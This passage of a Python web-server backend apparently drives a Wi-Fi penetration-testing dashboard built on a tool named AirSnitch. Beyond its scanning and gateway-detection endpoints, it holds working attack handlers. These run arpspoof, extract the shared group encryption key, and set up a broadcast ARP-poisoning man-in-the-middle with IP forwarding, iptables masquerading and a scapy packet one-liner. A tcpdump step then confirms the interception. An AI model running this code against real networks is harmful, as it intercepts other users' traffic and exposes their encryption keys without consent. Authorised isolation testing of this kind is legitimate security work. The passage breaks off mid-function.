        "wpa_mode": _active_wpa_mode.get(iface, ""),
    })


async def api_netinfo(request):
    """Get current network info: IP, gateway, SSID for an interface."""
    body = await request.json()
    iface = body.get("iface", "").strip()
    if not iface or not re.match(r'^[a-zA-Z0-9_-]+$', iface):
        return web.json_response({"error": "Invalid interface"}, status=400)

    # IP address
    rc, out = run(f"ip -4 addr show {iface} 2>/dev/null")
    ip_addr = subnet = ""
    for line in out.splitlines():
        if "inet " in line:
            cidr = line.strip().split()[1]
            ip_addr = cidr.split("/")[0]
            subnet = cidr
            break

    # Default gateway — try multiple methods
    gateway = ""
    gw_debug = []
    # Method 1: ip route with dev filter
    rc, out = run(f"ip route show default dev {iface} 2>/dev/null")
    gw_debug.append(f"M1 ip route default dev {iface}: rc={rc} out={out.strip()!r}")
    if "default via" in out:
        gateway = out.split("via")[1].strip().split()[0]
    # Method 2: ip route without dev filter — but ONLY accept routes for our interface
    if not gateway:
        rc, out = run("ip route show default 2>/dev/null")
        gw_debug.append(f"M2 ip route default: rc={rc} out={out.strip()!r}")
        for route_line in out.splitlines():
            if "default via" in route_line and f"dev {iface}" in route_line:
                gateway = route_line.split("via")[1].strip().split()[0]
                break
    # Method 3: ip route get — ask kernel how to reach an external IP (only accept our iface)
    if not gateway:
        rc, out = run(f"ip route get 8.8.8.8 oif {iface} 2>/dev/null")
        gw_debug.append(f"M3 ip route get 8.8.8.8 oif {iface}: rc={rc} out={out.strip()!r}")
        if " via " in out and f"dev {iface}" in out:
            gateway = out.split(" via ")[1].strip().split()[0]
    # Method 4: check all routes for any "via" gateway on this interface
    if not gateway:
        rc, out = run(f"ip route show dev {iface} 2>/dev/null")
        gw_debug.append(f"M4 ip route show dev {iface}: rc={rc} out={out.strip()[:200]!r}")
        for line in out.splitlines():
            if " via " in line:
                gw_candidate = line.split(" via ")[1].strip().split()[0]
                if re.match(r'^\d+\.\d+\.\d+\.\d+$', gw_candidate):
                    gateway = gw_candidate
                    break
    # Method 4b: dhcpcd lease — dhcpcd may have the gateway even if no route was added
    if not gateway:
        rc, out = run(f"dhcpcd -U {iface} 2>/dev/null", timeout=5)
        lease_gw = ""
        for line in out.splitlines():
            if line.startswith("routers=") or line.startswith("new_routers="):
                lease_gw = line.split("=", 1)[1].strip().split()[0]
                break
        gw_debug.append(f"M4b dhcpcd -U lease: rc={rc} routers={lease_gw!r}")
        if lease_gw and re.match(r'^\d+\.\d+\.\d+\.\d+$', lease_gw):
            gateway = lease_gw
            # Also add the default route so scans/tests can reach the gateway
            run(f"ip route add default via {gateway} dev {iface} metric 600 2>/dev/null", timeout=3)
            gw_debug.append(f"Added default route via {gateway} dev {iface} metric 600")
    # Method 5: check ARP table — if .1 or .254 is already known, it's likely the gateway
    if not gateway and ip_addr:
        rc, out = run(f"ip neigh show dev {iface} 2>/dev/null")
        gw_debug.append(f"M5 ip neigh show dev {iface}: rc={rc} entries={len(out.strip().splitlines())}")
        gw_octets = ip_addr.split(".")
        gw_prefix = f"{gw_octets[0]}.{gw_octets[1]}.{gw_octets[2]}."
        for suffix in ["1", "254"]:
            candidate = gw_prefix + suffix
            if candidate == ip_addr:
                continue
            # Check if this IP is in the ARP table with a valid MAC (REACHABLE/STALE/DELAY)
            for line in out.splitlines():
                if line.startswith(candidate + " ") and "FAILED" not in line and "INCOMPLETE" not in line:
                    gateway = candidate
                    gw_debug.append(f"M5 found {candidate} in ARP table")
                    break
            if gateway:
                break
    # Method 6: arping .1 and .254 (no -w flag — Kali arping treats -w as microseconds)
    if not gateway and ip_addr:
        gw_octets = ip_addr.split(".")
        gw_prefix = f"{gw_octets[0]}.{gw_octets[1]}.{gw_octets[2]}."
        for suffix in ["1", "254"]:
            candidate = gw_prefix + suffix
            if candidate == ip_addr:
                continue
            rc2, out2 = run(f"arping -c 1 -I {iface} {candidate} 2>/dev/null", timeout=5)
            gw_debug.append(f"M6 arping {candidate}: rc={rc2}")
            if rc2 == 0:
                gateway = candidate
                break
    # Method 7: ping .1 and .254 as last resort
    if not gateway and ip_addr:
        gw_octets = ip_addr.split(".")
        gw_prefix = f"{gw_octets[0]}.{gw_octets[1]}.{gw_octets[2]}."
        for suffix in ["1", "254"]:
            candidate = gw_prefix + suffix
            if candidate == ip_addr:
                continue
            rc2, _ = run(f"ping -c 1 -W 1 -I {iface} {candidate} 2>/dev/null", timeout=5)
            if rc2 == 0:
                gateway = candidate
                break

    # Connected SSID
    rc, out = run(f"iw dev {iface} link 2>/dev/null")
    ssid = ""
    for line in out.splitlines():
        if "SSID:" in line:
            ssid = line.split("SSID:")[1].strip()
            break

    if not gateway:
        gw_debug.append("All 7 methods exhausted — no gateway found")
    else:
        gw_debug.append(f"Found gateway: {gateway}")
    append_log("GW detection: " + " | ".join(gw_debug))

    return web.json_response({
        "connected": bool(ip_addr),
        "ip": ip_addr, "subnet": subnet,
        "gateway": gateway, "ssid": ssid,
        "gw_debug": gw_debug,
        "wpa_mode": _active_wpa_mode.get(iface, ""),
    })


async def api_discover(request):
    """Discover clients on the local network via arp-scan."""
    body = await request.json()
    iface = body.get("iface", "").strip()
    if not iface or not re.match(r'^[a-zA-Z0-9_-]+$', iface):
        return web.json_response({"error": "Invalid interface"}, status=400)

    append_log(f"$ arp-scan --localnet -I {iface}")
    rc, out = await async_run(f"arp-scan --localnet -I {iface} 2>&1", timeout=30)
    append_log(out)

    clients = []
    seen_macs = set()
    our_ip = _get_iface_ip(iface)
    for line in out.splitlines():
        # Skip DUP lines from arp-scan
        if "(DUP:" in line:
            continue
        parts = line.split('\t')
        if len(parts) >= 2 and re.match(r'^\d+\.\d+\.\d+\.\d+$', parts[0].strip()):
            ip = parts[0].strip()
            mac = parts[1].strip() if len(parts) > 1 else ""
            vendor = parts[2].strip() if len(parts) > 2 else ""
            # Skip our own IP
            if ip == our_ip:
                continue
            # Deduplicate by MAC address
            if mac and mac in seen_macs:
                continue
            if mac:
                seen_macs.add(mac)
            clients.append({"ip": ip, "mac": mac, "vendor": vendor})

    return web.json_response({"clients": clients, "raw": out})


async def api_test_ping(request):
    """Ping a target to test Layer 3 reachability."""
    body = await request.json()
    target = body.get("target", "").strip()
    iface = body.get("iface", "").strip()
    if not target or not re.match(r'^[\d.]+$', target):
        return web.json_response({"error": "Invalid target IP"}, status=400)
    if not iface or not re.match(r'^[a-zA-Z0-9_-]+$', iface):
        return web.json_response({"error": "Invalid interface"}, status=400)

    cmd = f"ping -c 4 -W 2 -I {iface} {target} 2>&1"
    append_log(f"$ {cmd}")
    rc, out = await async_run(cmd, timeout=15)
    append_log(out)
    reachable = "bytes from" in out
    return web.json_response({"reachable": reachable, "output": out})


async def api_test_arping(request):
    """Test Layer 2 ARP reachability to a target."""
    body = await request.json()
    target = body.get("target", "").strip()
    iface = body.get("iface", "").strip()
    if not target or not re.match(r'^[\d.]+$', target):
        return web.json_response({"error": "Invalid target IP"}, status=400)
    if not iface or not re.match(r'^[a-zA-Z0-9_-]+$', iface):
        return web.json_response({"error": "Invalid interface"}, status=400)

    cmd = f"arping -c 4 -I {iface} {target} 2>&1"
    append_log(f"$ {cmd}")
    rc, out = await async_run(cmd, timeout=15)
    append_log(out)
    reachable = "reply from" in out.lower() or "bytes from" in out.lower() or "unicast" in out.lower()
    return web.json_response({"reachable": reachable, "output": out})


async def api_test_portscan(request):
    """Quick nmap port scan of a target."""
    body = await request.json()
    target = body.get("target", "").strip()
    if not target or not re.match(r'^[\d.]+$', target):
        return web.json_response({"error": "Invalid target IP"}, status=400)

    cmd = f"nmap -sT -T4 --top-ports 100 {target} 2>&1"
    append_log(f"$ {cmd}")
    rc, out = await async_run(cmd, timeout=60)
    append_log(out)
    return web.json_response({"output": out})


async def api_test_subnetscan(request):
    """Nmap subnet scan — discover hosts + top ports across a subnet."""
    body = await request.json()
    subnet = body.get("subnet", "").strip()
    scan_type = body.get("scan_type", "quick").strip()

    # Validate CIDR notation: e.g. 192.168.1.0/24
    if not subnet or not re.match(r'^[\d.]+/\d{1,2}$', subnet):
        return web.json_response({"error": "Invalid subnet (use CIDR, e.g. 192.168.1.0/24)"}, status=400)

    # Validate the prefix length
    prefix = int(subnet.split("/")[1])
    if prefix < 16:
        return web.json_response({"error": "Subnet too large (minimum /16)"}, status=400)

    if scan_type == "discovery":
        # Host discovery only — fast ping sweep
        cmd = f"nmap -sn -T4 {subnet} 2>&1"
        timeout = 120
    elif scan_type == "top100":
        # Full scan — top 100 ports per host
        cmd = f"nmap -sT -T4 --top-ports 100 {subnet} 2>&1"
        timeout = 600
    else:
        # Default quick — host discovery + top 20 ports
        cmd = f"nmap -sT -T4 --top-ports 20 --open {subnet} 2>&1"
        timeout = 300

    append_log(f"$ {cmd}")
    rc, out = await async_run(cmd, timeout=timeout)
    append_log(out)
    return web.json_response({"output": out, "command": cmd})


# ── REST API: Advanced Pentest Tests ─────────────────────────────────────────

async def api_test_arpspoof(request):
    """ARP spoof test — can this client poison ARP between target and gateway?"""
    body = await request.json()
    iface = body.get("iface", "").strip()
    target = body.get("target", "").strip()
    gateway = body.get("gateway", "").strip()
    if not iface or not re.match(r'^[a-zA-Z0-9_-]+$', iface):
        return web.json_response({"error": "Invalid interface"}, status=400)
    if not target or not re.match(r'^[\d.]+$', target):
        return web.json_response({"error": "Invalid target IP"}, status=400)
    if not gateway or not re.match(r'^[\d.]+$', gateway):
        return web.json_response({"error": "Invalid gateway IP"}, status=400)

    results = []
    spoofed = False

    # Step 1: Record the target's current ARP entry for the gateway
    cmd1 = f"ip neigh show {gateway} dev {iface} 2>&1"
    append_log(f"$ {cmd1}")
    rc, our_arp_before = run(cmd1, timeout=5)
    results.append(f"$ {cmd1}")
    results.append(f"Before: {our_arp_before.strip() or '(no entry)'}")
    results.append("")

    # Step 2: Send gratuitous ARP claiming to be the gateway (5 packets)
    # This uses arping to send unsolicited ARP replies
    our_ip = _get_iface_ip(iface)
    our_mac_rc, our_mac = run(f"cat /sys/class/net/{iface}/address 2>/dev/null", timeout=3)
    our_mac = our_mac.strip()

    results.append(f"Our IP: {our_ip}, Our MAC: {our_mac}")
    results.append(f"Sending gratuitous ARP: 'I am {gateway}' to {target}")
    results.append("")

    # Use arpspoof if available, else fall back to arping
    have_arpspoof = run("which arpspoof 2>/dev/null")[0] == 0

    if have_arpspoof:
        # Run arpspoof for 5 seconds in background, then kill it
        cmd2 = f"timeout 5 arpspoof -i {iface} -t {target} {gateway} 2>&1"
        append_log(f"$ {cmd2}")
        results.append(f"$ {cmd2}")
        rc, out = await async_run(cmd2, timeout=10)
        results.append(out[:500] if out else "(no output)")
    else:
        # Fallback: send gratuitous ARP with arping
        # -U = unsolicited ARP (gratuitous), -s = source IP (pretend to be gateway)
        cmd2 = f"arping -c 5 -U -I {iface} -s {gateway} {target} 2>&1"
        append_log(f"$ {cmd2}")
        results.append(f"$ {cmd2}")
        rc, out = await async_run(cmd2, timeout=10)
        results.append(out[:500] if out else "(no output)")

    results.append("")
    await asyncio.sleep(1)

    # Step 3: Check if target responds to us (try pinging target to see if traffic flows)
    cmd3 = f"ping -c 2 -W 1 -I {iface} {target} 2>&1"
    append_log(f"$ {cmd3}")
    rc, ping_out = await async_run(cmd3, timeout=5)
    results.append(f"$ {cmd3}")
    results.append(ping_out)
    results.append("")

    # Step 4: Check our ARP table — did we get the target's real MAC?
    cmd4 = f"ip neigh show dev {iface} 2>&1"
    append_log(f"$ {cmd4}")
    rc, arp_table = await async_run(cmd4, timeout=5)
    results.append(f"$ ip neigh show dev {iface}")
    results.append(arp_table)

    # Determine if spoofing had any effect
    # If we could ping the target AND we sent spoofed ARPs, isolation failed
    if "bytes from" in ping_out and have_arpspoof:
        spoofed = True

    append_log(f"ARP spoof test: spoofed={spoofed}")
    return web.json_response({
        "spoofed": spoofed,
        "output": "\n".join(results),
        "have_arpspoof": have_arpspoof,
    })


async def api_test_gwprobe(request):
    """Probe the gateway for management interfaces and test internet access."""
    body = await request.json()
    iface = body.get("iface", "").strip()
    gateway = body.get("gateway", "").strip()
    if not iface or not re.match(r'^[a-zA-Z0-9_-]+$', iface):
        return web.json_response({"error": "Invalid interface"}, status=400)
    if not gateway or not re.match(r'^[\d.]+$', gateway):
        return web.json_response({"error": "Invalid gateway IP"}, status=400)

    results = []

    # Step 1: Scan gateway for management ports
    mgmt_ports = "22,23,53,80,443,8080,8443,8888"
    cmd1 = f"nmap -sT -T4 -p {mgmt_ports} {gateway} 2>&1"
    append_log(f"$ {cmd1}")
    results.append(f"── Gateway Management Ports ({gateway}) ──")
    results.append(f"$ nmap -sT -T4 -p {mgmt_ports} {gateway}")
    results.append("")
    rc, out = await async_run(cmd1, timeout=30)
    append_log(out)
    results.append(out)
    results.append("")

    # Parse open ports
    open_ports = []
    for line in out.splitlines():
        if "/tcp" in line and "open" in line:
            open_ports.append(line.strip())

    # Step 2: Test internet access
    results.append("── Internet Access ──")
    cmd2 = f"ping -c 2 -W 2 -I {iface} 8.8.8.8 2>&1"
    append_log(f"$ {cmd2}")
    results.append(f"$ ping -c 2 -I {iface} 8.8.8.8")
    rc, ping_out = await async_run(cmd2, timeout=10)
    append_log(ping_out)
    results.append(ping_out)
    internet = "bytes from" in ping_out

    # Step 3: Test DNS resolution
    results.append("")
    results.append("── DNS Resolution ──")
    cmd3 = f"nslookup example.com 2>&1"
    append_log(f"$ {cmd3}")
    rc, dns_out = await async_run(cmd3, timeout=10)
    append_log(dns_out)
    results.append(dns_out)
    dns_works = "Address:" in dns_out and "SERVFAIL" not in dns_out

    return web.json_response({
        "output": "\n".join(results),
        "open_ports": open_ports,
        "internet": internet,
        "dns": dns_works,
    })


async def api_test_vlanprobe(request):
    """Probe adjacent subnets to check for inter-VLAN routing."""
    body = await request.json()
    iface = body.get("iface", "").strip()
    gateway = body.get("gateway", "").strip()
    if not iface or not re.match(r'^[a-zA-Z0-9_-]+$', iface):
        return web.json_response({"error": "Invalid interface"}, status=400)
    if not gateway or not re.match(r'^[\d.]+$', gateway):
        return web.json_response({"error": "Invalid gateway IP"}, status=400)

    results = []
    reachable_subnets = []

    # Derive candidate gateways from the current gateway
    # e.g., if gateway is 192.168.1.1, try 192.168.0.1, 192.168.2.1, 10.0.0.1, etc.
    parts = gateway.split(".")
    candidates = set()

    # Adjacent /24 subnets (same /16)
    if len(parts) == 4:
        base = f"{parts[0]}.{parts[1]}"
        third = int(parts[2])
        gw_suffix = parts[3]  # usually .1 or .254
        for offset in [-1, 1, 2, 3]:
            adj = third + offset
            if 0 <= adj <= 255 and adj != third:
                candidates.add(f"{base}.{adj}.{gw_suffix}")
        # Also try .1 and .254 as gateway suffix
        for adj in [0, third + 1, third - 1]:
            if 0 <= adj <= 255 and adj != third:
                candidates.add(f"{base}.{adj}.1")
                candidates.add(f"{base}.{adj}.254")

    # Common private subnets
    common_gateways = ["10.0.0.1", "10.1.1.1", "10.10.10.1",
                       "172.16.0.1", "172.16.1.1",
                       "192.168.0.1", "192.168.1.1", "192.168.2.1",
                       "192.168.10.1", "192.168.100.1"]
    for g in common_gateways:
        if g != gateway:
            candidates.add(g)

    # Remove our own gateway and limit to 15 probes
    candidates.discard(gateway)
    candidate_list = sorted(candidates)[:15]

    results.append(f"── Cross-VLAN/Subnet Probe from {gateway} ──")
    results.append(f"Testing {len(candidate_list)} candidate gateways...")
    results.append("")

    for cand in candidate_list:
        cmd = f"ping -c 1 -W 1 -I {iface} {cand} 2>&1"
        rc, out = await async_run(cmd, timeout=3)
        alive = "bytes from" in out
        status = "✓ REACHABLE" if alive else "✗ unreachable"
        results.append(f"  {cand:20s} {status}")
        if alive:
            reachable_subnets.append(cand)

    results.append("")
    if reachable_subnets:
        results.append(f"⚠ Found {len(reachable_subnets)} reachable subnet(s) — inter-VLAN routing may be enabled!")
        for s in reachable_subnets:
            results.append(f"  → {s}")
    else:
        results.append("✓ No adjacent subnets reachable — inter-VLAN routing appears blocked.")

    append_log(f"VLAN probe: {len(reachable_subnets)} reachable of {len(candidate_list)} tested")
    return web.json_response({
        "output": "\n".join(results),
        "reachable": reachable_subnets,
        "tested": len(candidate_list),
    })


async def api_test_dhcpinfo(request):
    """Enumerate DHCP server information using nmap broadcast-dhcp-discover."""
    body = await request.json()
    iface = body.get("iface", "").strip()
    if not iface or not re.match(r'^[a-zA-Z0-9_-]+$', iface):
        return web.json_response({"error": "Invalid interface"}, status=400)

    results = []
    results.append("── DHCP Server Reconnaissance ──")
    results.append("")

    # Method 1: nmap DHCP discover
    cmd1 = f"nmap --script broadcast-dhcp-discover -e {iface} 2>&1"
    append_log(f"$ {cmd1}")
    results.append(f"$ {cmd1}")
    results.append("")
    rc, out = await async_run(cmd1, timeout=30)
    append_log(out)
    results.append(out)
    results.append("")

    # Method 2: Check our current lease info
    results.append("── Current Lease Info ──")
    # Try dhcpcd lease file
    lease_rc, lease_out = run(f"dhcpcd -U {iface} 2>&1", timeout=5)
    if lease_rc == 0 and lease_out.strip():
        results.append(lease_out[:500])
    else:
        # Try lease files directly
        lease_paths = [
            f"/var/lib/dhcpcd/{iface}.lease",
            f"/var/lib/dhcpcd5/{iface}.lease",
            f"/var/lib/dhcp/dhclient.{iface}.leases",
        ]
        found = False
        for lp in lease_paths:
            if os.path.exists(lp):
                with open(lp, "r", errors="replace") as f:
                    content = f.read()
                results.append(f"Lease file ({lp}):")
                results.append(content[:500])
                found = True
                break
        if not found:
            results.append("(no lease file found)")

    results.append("")
    results.append("── Security Notes ──")
    results.append("• If multiple DHCP servers respond → rogue DHCP possible")
    results.append("• Short lease times → faster DHCP starvation attack")
    results.append("• No DHCP snooping → DHCP spoofing attacks possible")

    return web.json_response({"output": "\n".join(results)})


# ── REST API: AirSnitch Commands ─────────────────────────────────────────────

async def api_airsnitch_run(request):
    """Run an airsnitch test command."""
    body = await request.json()
    flag = body.get("flag", "")
    iface1 = body.get("iface1", "").strip()
    iface2 = body.get("iface2", "").strip()
    extra = body.get("extra", "").strip()

    allowed_flags = [
        "--check-gtk-shared", "--c2c-ip", "--c2c-port-steal",
        "--c2c-port-steal-uplink", "--c2c-broadcast", "--c2c-eth",
        "--c2c", "--c2c-gtk-inject", "--c2m", "--c2m-ip",
    ]
    if flag not in allowed_flags:
        return web.json_response({"error": f"Invalid flag: {flag}"}, status=400)
    if not iface1 or not re.match(r'^[a-zA-Z0-9_-]+$', iface1):
        return web.json_response({"error": "Primary interface is required"}, status=400)
    if iface2 and not re.match(r'^[a-zA-Z0-9_-]+$', iface2):
        return web.json_response({"error": f"Invalid interface: {iface2}"}, status=400)

    cmd = f"cd {AIRSNITCH_DIR} && source venv/bin/activate && python3 airsnitch.py {iface1} {flag}"
    if iface2:
        cmd += f" {iface2}"

    allowed_extra = ["--same-bss", "--other-bss", "--no-ssid-check",
                     "--ping", "--debug", "--same-id", "--flip-id"]
    if extra:
        for token in extra.split():
            if token in allowed_extra:
                cmd += f" {token}"

    cmd += f" --config {CONFIG_PATH}"

    append_log(f"$ {cmd}")
    rc, out = await async_run(f"bash -c '{cmd}'", timeout=120)
    append_log(out)
    return web.json_response({"output": out, "returncode": rc})


async def api_bypass_test(request):
    """Run an AirSnitch bypass test using the single connected interface.
    Leverages the modified wpa_supplicant's frame injection and GTK
    manipulation capabilities via airsnitch.py with --same-bss --same-id."""
    body = await request.json()
    flag = body.get("flag", "")
    iface = body.get("iface", "").strip()

    if not iface or not re.match(r'^[a-zA-Z0-9_-]+$', iface):
        return web.json_response({"error": "Invalid interface"}, status=400)

    # Enforce AirSnitch mode is active
    current_mode = _active_wpa_mode.get(iface, "")
    if current_mode != "airsnitch":
        return web.json_response({
            "error": f"AirSnitch mode not active on {iface} (current: {current_mode or 'none'}). "
                     "Reconnect using AirSnitch mode to run bypass tests."
        }, status=400)

    # Whitelist of allowed test flags
    allowed_flags = [
        "--check-gtk-shared", "--c2c", "--c2c-ip", "--c2c-port-steal",
        "--c2c-port-steal-uplink", "--c2c-broadcast", "--c2c-eth",
        "--c2c-gtk-inject", "--c2m", "--c2m-ip",
    ]
    if flag not in allowed_flags:
        return web.json_response({"error": f"Invalid test flag: {flag}"}, status=400)

    # Verify airsnitch.py exists
    airsnitch_script = os.path.join(AIRSNITCH_DIR, "airsnitch.py")
    if not os.path.isfile(airsnitch_script):
        return web.json_response({
            "error": f"airsnitch.py not found at {airsnitch_script}. "
                     "Ensure the AirSnitch research framework is installed (run install.sh)."
        }, status=500)

    # Use the config from the current connection (quickconnect → QUICK_CONF_PATH)
    config_file = QUICK_CONF_PATH if os.path.isfile(QUICK_CONF_PATH) else CONFIG_PATH
    if not os.path.isfile(config_file):
        return web.json_response({
            "error": "No wpa_supplicant config found. Connect to a network first."
        }, status=400)

    # Build command: single interface mode.
    # Each test flag (--c2c, --c2c-eth, etc.) takes an interface argument (the 2nd NIC).
    # For single-NIC mode, we pass the SAME interface as both the positional arg and
    # the flag value, combined with --same-bss --same-id so the tool uses one identity.
    cmd = (f"cd {AIRSNITCH_DIR} && source venv/bin/activate && "
           f"python3 airsnitch.py {iface} {flag} {iface} --same-bss --same-id "
           f"--config {config_file}")

    append_log(f"[bypass-test] $ airsnitch.py {iface} {flag} {iface} --same-bss --same-id")
    rc, out = await async_run(f"bash -c '{cmd}'", timeout=120)
    append_log(f"[bypass-test] rc={rc}")
    if out:
        append_log(out[:500])

    # Parse verdict from output keywords
    out_lower = out.lower()
    if "vulnerable" in out_lower or "isolation bypass" in out_lower or "success" in out_lower:
        verdict = "FAIL"
        verdict_detail = "Isolation bypass detected \u2014 network is VULNERABLE"
    elif "not vulnerable" in out_lower or "isolated" in out_lower or "blocked" in out_lower:
        verdict = "PASS"
        verdict_detail = "Isolation appears to be enforced"
    elif rc != 0:
        verdict = "ERROR"
        verdict_detail = f"Test exited with error (rc={rc})"
    else:
        verdict = "INCONCLUSIVE"
        verdict_detail = "Could not determine pass/fail \u2014 review raw output"

    return web.json_response({
        "output": out,
        "returncode": rc,
        "verdict": verdict,
        "verdict_detail": verdict_detail,
        "flag": flag,
    })


async def api_gtk_info(request):
    """Extract the Group Temporal Key (GTK) from the modified wpa_supplicant.
    The GTK is shared by ALL clients on the same BSS — it encrypts broadcast/
    multicast frames and enables GTK abuse attacks that bypass AP isolation."""
    body = await request.json()
    iface = body.get("iface", "").strip()
    if not iface or not re.match(r'^[a-zA-Z0-9_-]+$', iface):
        return web.json_response({"error": "Invalid interface"}, status=400)

    current_mode = _active_wpa_mode.get(iface, "")
    if current_mode != "airsnitch":
        return web.json_response({
            "error": "GTK extraction requires AirSnitch mode (modified wpa_supplicant)"
        }, status=400)

    # Extract GTK via modified wpa_cli
    cmd = f"cd {AIRSNITCH_DIR} && {MODIFIED_WPA_CLI} -p wpaspy_ctrl -i {iface} GET gtk 2>&1"
    rc, out = await async_run(cmd, timeout=10)

    if rc != 0 or not out.strip():
        return web.json_response({
            "error": f"Failed to extract GTK (rc={rc}): {out}",
            "raw": out,
        }, status=500)

    # Parse GTK output — expected format: "gtk_hex keyid sequence" or just hex
    parts = out.strip().split()
    gtk_hex = parts[0] if parts else out.strip()
    key_id = parts[1] if len(parts) > 1 else "?"
    seq = parts[2] if len(parts) > 2 else "?"

    # Also get our MAC and BSSID for display
    _, mac_out = run(f"cat /sys/class/net/{iface}/address 2>/dev/null", timeout=3)
    _, status_out = run(
        f"cd {AIRSNITCH_DIR} && {MODIFIED_WPA_CLI} -p wpaspy_ctrl -i {iface} status 2>/dev/null",
        timeout=5,
    )
    bssid = ""
    for line in status_out.splitlines():
        if line.startswith("bssid="):
            bssid = line.split("=", 1)[1].strip()
            break

    append_log(f"[gtk-info] Extracted GTK ({len(gtk_hex) * 4}-bit) from {iface}, BSSID={bssid}")
    return web.json_response({
        "gtk": gtk_hex,
        "key_id": key_id,
        "sequence": seq,
        "gtk_bits": len(gtk_hex) * 4 if gtk_hex else 0,
        "mac": mac_out.strip(),
        "bssid": bssid,
        "raw": out.strip(),
        "note": "All clients on this BSS share the same GTK. "
                "This key encrypts broadcast/multicast frames and enables GTK abuse attacks.",
    })


async def api_arp_poison_broadcast(request):
    """Full MITM via broadcast ARP poison.
    1. Enables IP forwarding so intercepted traffic is forwarded (not dropped).
    2. Adds iptables MASQUERADE so forwarded packets go out with correct source.
    3. Sends broadcast gratuitous ARP claiming gateway IP at our MAC.
    If the AP forwards broadcast frames, ALL clients' ARP caches are poisoned."""
    body = await request.json()
    iface = body.get("iface", "").strip()
    gateway = body.get("gateway", "").strip()
    count = min(int(body.get("count", 10)), 100)

    if not iface or not re.match(r'^[a-zA-Z0-9_-]+$', iface):
        return web.json_response({"error": "Invalid interface"}, status=400)
    if not gateway or not re.match(r'^\d+\.\d+\.\d+\.\d+$', gateway):
        return web.json_response({"error": "Invalid gateway IP"}, status=400)

    # Get our MAC and IP
    _, mac_out = run(f"cat /sys/class/net/{iface}/address 2>/dev/null", timeout=3)
    our_mac = mac_out.strip()
    if not our_mac:
        return web.json_response({"error": "Could not determine MAC address"}, status=500)
    our_ip = _get_iface_ip(iface)

    setup_log = []

    # Step 1: Enable IP forwarding
    _, fwd_before = run("cat /proc/sys/net/ipv4/ip_forward 2>/dev/null", timeout=3)
    run("sysctl -w net.ipv4.ip_forward=1 2>/dev/null", timeout=3)
    setup_log.append(f"IP forwarding: was={fwd_before.strip()}, now=1")

    # Step 2: Add iptables MASQUERADE (idempotent — check first)
    rc_check, _ = run(
        f"iptables -t nat -C POSTROUTING -o {iface} -j MASQUERADE 2>/dev/null", timeout=3)
    if rc_check != 0:
        run(f"iptables -t nat -A POSTROUTING -o {iface} -j MASQUERADE 2>/dev/null", timeout=3)
        setup_log.append(f"iptables: added MASQUERADE on {iface}")
    else:
        setup_log.append(f"iptables: MASQUERADE already active on {iface}")

    # Step 3: Send broadcast gratuitous ARP
    scapy_script = (
        "from scapy.all import *; "
        f"p = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op=2, "
        f"psrc='{gateway}', hwsrc='{our_mac}', "
        f"pdst='255.255.255.255', hwdst='ff:ff:ff:ff:ff:ff'); "
        f"sendp(p, iface='{iface}', count={count}, inter=0.3, verbose=True)"
    )
    cmd = (f"cd {AIRSNITCH_DIR} && . venv/bin/activate && "
           f'python3 -c "{scapy_script}" 2>&1')

    append_log(f"[arp-poison] MITM setup: {'; '.join(setup_log)}")
    append_log(f"[arp-poison] Broadcasting gratuitous ARP: {gateway} is-at {our_mac} x{count}")
    rc, out = await async_run(cmd, timeout=60)
    append_log(f"[arp-poison] rc={rc}")

    return web.json_response({
        "output": out,
        "returncode": rc,
        "our_mac": our_mac,
        "our_ip": our_ip,
        "gateway": gateway,
        "count": count,
        "setup": setup_log,
        "description": (
            f"MITM setup complete. IP forwarding enabled, iptables MASQUERADE active.\n"
            f"Sent {count} broadcast ARP replies: \"{gateway} is-at {our_mac}\".\n"
            f"If the AP forwards broadcasts, all clients now route through us.\n"
            f"Use 'Verify Capture' to confirm intercepted traffic."
        ),
    })


async def api_mitm_verify(request):
    """Run a brief tcpdump capture to verify MITM is working.
    Captures packets on the interface for a short window and checks
    if we see traffic from other hosts (not our own IP)."""
    body = await request.json()
    iface = body.get("iface", "").strip()

    if not iface or not re.match(r'^[a-zA-Z0-9_-]+$', iface):
        return web.json_response({"error": "Invalid interface"}, status=400)

    our_ip = _get_iface_ip(iface)
    if not our_ip:
        return web.json_response({"error": "No IP on interface"}, status=400)

    # Capture 10 seconds of traffic, exclude our own IP as source,
    # exclude broadcast/multicast, show only IP traffic from other hosts
    # -c 50 limits to 50 packets max, timeout ensures we don't hang
    tcpdump_filter = f"ip and not src host {our_ip} and not dst host 255.255.255.255 and not multicast"
    cmd = (f"timeout 10 tcpdump -i {iface} -c 50 -nn -q "
           f"'{tcpdump_filter}' 2>&1")

    append_log(f"[mitm-verify] Capturing on {iface} for 10s (filter: not from {our_ip})")
    rc, out = await async_run(cmd, timeout=15)

    # Parse results — count unique source IPs
    lines = out.strip().splitlines()
    src_ips = set()
    packet_lines = []
    for line in lines:
        # tcpdump lines look like: "12:34:56.789 IP 192.168.1.5.443 > 192.168.1.1.80: ..."
        if " IP " in line or " IP6 " in line:
            packet_lines.append(line)
            # Extract source IP (after "IP " before first ".")
            parts = line.split(" IP ")
            if len(parts) > 1:
                src = parts[1].split(" > ")[0].strip()
                # Remove port (last .port)
                src_ip = ".".join(src.split(".")[:-1]) if src.count(".") >= 4 else src
                if src_ip and src_ip != our_ip:
                    src_ips.add(src_ip)

    intercepted = len(packet_lines)
    unique_hosts = len(src_ips)

    if intercepted > 0:
        verdict = "MITM ACTIVE"
        detail = (f"Captured {intercepted} packets from {unique_hosts} other host(s). "
                  f"Traffic is being routed through this device.")
    else:
        verdict = "NO TRAFFIC INTERCEPTED"
        detail = ("No traffic from other clients seen in 10 seconds. "
                  "Either ARP poison didn't land, the AP blocks broadcasts, "
                  "or no other clients are active.")

    return web.json_response({
        "output": out,
        "intercepted_packets": intercepted,
        "unique_hosts": unique_hosts,
        "source_ips": list(src_ips),
        "our_ip": our_ip,
        "verdict": verdict,
        "detail": detail,
    })


async def api_mitm_stop(request):
    """Clean up MITM attack — restore ARP, disable forwarding, remove iptables rule."""
    body = await request.json()
    iface = body.get("iface", "").strip()
    gateway = body.get("gateway", "").strip()

    if not iface or not re.match(r'^[a-zA-Z0-9_-]+$', iface):
        return web.json_response({"error": "Invalid interface"}, status=400)

    cleanup_log = []

    # Step 1: Disable IP forwarding
    run("sysctl -w net.ipv4.ip_forward=0 2>/dev/null", timeout=3)
    cleanup_log.append("IP forwarding disabled")

    # Step 2: Remove iptables MASQUERADE
    rc, _ = run(
        f"iptables -t nat -D POSTROUTING -o {iface} -j MASQUERADE 2>/dev/null", timeout=3)
    if rc == 0:
        cleanup_log.append(f"iptables MASQUERADE removed from {iface}")
    else:
